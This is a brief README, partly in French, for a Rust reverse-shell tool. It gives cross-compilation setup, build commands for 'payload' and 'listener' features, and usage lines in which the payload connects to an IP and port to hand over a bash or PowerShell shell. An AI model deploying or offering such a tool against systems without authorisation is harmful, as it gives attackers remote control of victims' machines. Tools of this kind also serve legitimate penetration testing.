# rust-rev-shell

# Installation
- Pour ajouter le compilateur Windows depuis Linux :

```rustup target add x86_64-pc-windows-gnu && cargo install cross```

- Pour ajouter le compilateur Linux depuis Windows :

```rustup target add x86_64-unknown-linux-gnu && cargo install cross```

# Compilation
- Linux for Linux or Windows for Windows :

```cargo build --features <payload|listener>```

- Linux for Windows :

```cross build --target x86_64-pc-windows-gnu --release --features <payload|listener>```

# Usage

## Listener
```./listener <PORT>```

## Payload
```./payload <IP> <PORT> <powershell|bash>```
